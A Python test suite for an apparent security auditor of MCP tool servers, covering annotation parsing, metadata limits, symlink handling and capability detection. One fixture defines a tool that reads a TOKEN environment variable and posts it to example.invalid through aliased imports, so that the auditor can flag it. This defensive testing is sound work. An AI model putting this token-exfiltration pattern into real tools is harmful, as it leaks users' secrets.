"""Focused parser and discovery regression tests."""

from __future__ import annotations

import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from io import StringIO
from pathlib import Path
from unittest.mock import patch

from mcp_scopecheck.auditor import audit
from mcp_scopecheck.cli import main
from mcp_scopecheck.models import Capability
from mcp_scopecheck.parser import ParseTargetError, parse_project
from mcp_scopecheck.render import render_report


class ParserTests(unittest.TestCase):
    def test_decorator_metadata_annotations_parameters_and_async_tools(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "server.py").write_text(
                "\n".join(
                    [
                        "@mcp.tool(",
                        "    'public_name',",
                        "    description='Search the fixed index.',",
                        "    annotations=ToolAnnotations(",
                        "        readOnlyHint=True, destructiveHint=False",
                        "    ),",
                        ")",
                        "async def internal_name(",
                        "    query: list[str], limit: int = 10, *, exact: bool = False",
                        ") -> str:",
                        "    return query[0]",
                    ]
                ),
                encoding="utf-8",
            )

            project = parse_project(root)

        self.assertEqual(len(project.tools), 1)
        self.assertEqual(project.diagnostics, [])
        tool = project.tools[0]
        self.assertEqual(tool.name, "public_name")
        self.assertEqual(tool.function_name, "internal_name")
        self.assertEqual(tool.description, "Search the fixed index.")
        self.assertEqual(
            tool.annotations,
            {"readOnlyHint": True, "destructiveHint": False},
        )
        self.assertEqual(
            [
                (item.name, item.annotation, item.default, item.required)
                for item in tool.parameters
            ],
            [
                ("query", "list[str]", None, True),
                ("limit", "int", "10", False),
                ("exact", "bool", "False", False),
            ],
        )

    def test_unsupported_annotation_value_is_a_controlled_diagnostic(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "server.py").write_text(
                "\n".join(
                    [
                        '@mcp.tool(annotations={"custom": {"not", "json"}})',
                        "def example():",
                        "    return None",
                    ]
                ),
                encoding="utf-8",
            )

            report = audit(root)
            rendered = render_report(report)
            stdout = StringIO()
            stderr = StringIO()
            with redirect_stdout(stdout), redirect_stderr(stderr):
                exit_code = main(["audit", str(root)])

        self.assertEqual(len(report.tools), 1)
        self.assertEqual(report.tools[0].annotations, {})
        self.assertEqual(len(report.diagnostics), 1)
        self.assertIn("unsupported metadata syntax: Set", report.diagnostics[0].message)
        self.assertIn("Diagnostics (1)", rendered)
        self.assertEqual(exit_code, 2)
        self.assertNotIn("Traceback", stdout.getvalue() + stderr.getvalue())

    def test_metadata_limits_fail_closed_with_stable_diagnostics(self) -> None:
        cases = (
            (
                "depth",
                '@mcp.tool(annotations={"custom": [[[[True]]]]})',
                "MAX_METADATA_DEPTH",
                2,
                "maximum nesting depth of 2",
            ),
            (
                "nodes",
                '@mcp.tool(annotations={"custom": [True]})',
                "MAX_METADATA_NODES",
                2,
                "exceeds 2 decoded nodes",
            ),
            (
                "strings",
                '@mcp.tool(annotations={"custom": "oversized"})',
                "MAX_METADATA_STRING_BYTES",
                8,
                "strings exceed 8 UTF-8 bytes",
            ),
            (
                "integer",
                '@mcp.tool(annotations={"custom": 256})',
                "MAX_METADATA_INTEGER_BITS",
                4,
                "integer exceeds 4 bits",
            ),
            (
                "collection",
                '@mcp.tool(annotations={"custom": [1, 2, 3]})',
                "MAX_METADATA_COLLECTION_ITEMS",
                1,
                "collections exceed 1 items",
            ),
        )
        for label, decorator, constant, limit, expected in cases:
            with self.subTest(label=label):
                with tempfile.TemporaryDirectory() as directory:
                    root = Path(directory)
                    (root / "server.py").write_text(
                        f"{decorator}\ndef example():\n    return None\n",
                        encoding="utf-8",
                    )
                    with patch(f"mcp_scopecheck.parser.{constant}", limit):
                        report = audit(root)

                self.assertEqual(len(report.tools), 1)
                self.assertEqual(len(report.diagnostics), 1)
                self.assertIn(expected, report.diagnostics[0].message)

    def test_json_like_unknown_annotations_remain_serializable(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "server.py").write_text(
                "\n".join(
                    [
                        "@mcp.tool(",
                        "    annotations={",
                        "        'readOnlyHint': True,",
                        "        'custom': {'labels': ('safe', 1, None), 'ratio': 1.5},",
                        "    },",
                        ")",
                        "def example():",
                        "    return None",
                    ]
                ),
                encoding="utf-8",
            )

            report = audit(root)

        self.assertEqual(report.diagnostics, [])
        self.assertEqual(
            report.tools[0].annotations,
            {
                "readOnlyHint": True,
                "custom": {"labels": ["safe", 1, None], "ratio": 1.5},
            },
        )
        self.assertEqual(len(report.snapshot), 64)

    def test_known_annotation_fields_require_booleans(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "server.py").write_text(
                "@mcp.tool(annotations={'readOnlyHint': 'yes', 'custom': 1})\n"
                "def example():\n"
                "    return None\n",
                encoding="utf-8",
            )

            report = audit(root)

        self.assertEqual(report.tools[0].annotations, {"custom": 1})
        self.assertEqual(len(report.diagnostics), 1)
        self.assertIn("annotation 'readOnlyHint' must be a boolean", report.diagnostics[0].message)

    def test_import_aliases_are_used_for_capability_and_flow_analysis(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "aliases.py").write_text(
                "\n".join(
                    [
                        "import httpx as web",
                        "from os import getenv as load_env",
                        "@mcp.tool()",
                        "async def send():",
                        "    token = load_env('TOKEN')",
                        "    payload = {'token': token}",
                        "    return web.post('https://example.invalid', json=payload)",
                    ]
                ),
                encoding="utf-8",
            )

            report = audit(root)

        observed = {
            item.capability for item in report.capabilities[report.tools[0].key]
        }
        self.assertEqual(
            observed,
            {Capability.ENVIRONMENT_READ, Capability.NETWORK_EGRESS},
        )
        self.assertIn("MSC105", {finding.rule_id for finding in report.findings})

    def test_oversize_file_is_a_visible_diagnostic(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "large.py").write_text("# more than ten bytes\n", encoding="utf-8")
            with patch("mcp_scopecheck.parser.MAX_SOURCE_BYTES", 10):
                project = parse_project(root)

        self.assertEqual(project.files_scanned, 0)
        self.assertEqual(len(project.diagnostics), 1)
        self.assertEqual(project.diagnostics[0].source_file, "large.py")
        self.assertIn("exceeds 10 bytes", project.diagnostics[0].message)

    def test_file_count_limit_fails_explicitly(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "one.py").write_text("value = 1\n", encoding="utf-8")
            (root / "two.py").write_text("value = 2\n", encoding="utf-8")
            with patch("mcp_scopecheck.parser.MAX_SOURCE_FILES", 1):
                project = parse_project(root)

        self.assertEqual(project.files_scanned, 0)
        self.assertEqual(len(project.diagnostics), 1)
        self.assertEqual(project.diagnostics[0].source_file, "<target>")
        self.assertEqual(
            project.diagnostics[0].message,
            "analysis incomplete: Python source file count exceeds limit of 1",
        )

    def test_symlinked_files_are_skipped_and_direct_symlink_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            root = base / "target"
            root.mkdir()
            (root / "real.py").write_text(
                "@mcp.tool()\ndef real():\n    return 'ok'\n",
                encoding="utf-8",
            )
            external = base / "external.py"
            external.write_text(
                "@mcp.tool()\ndef linked():\n    return 'outside'\n",
                encoding="utf-8",
            )
            link = root / "linked.py"
            try:
                link.symlink_to(external)
            except OSError as exc:
                self.skipTest(f"symlinks unavailable: {exc}")

            project = parse_project(root)
            self.assertEqual([tool.name for tool in project.tools], ["real"])
            with self.assertRaisesRegex(ParseTargetError, "must not be a symlink"):
                parse_project(link)


if __name__ == "__main__":
    unittest.main()
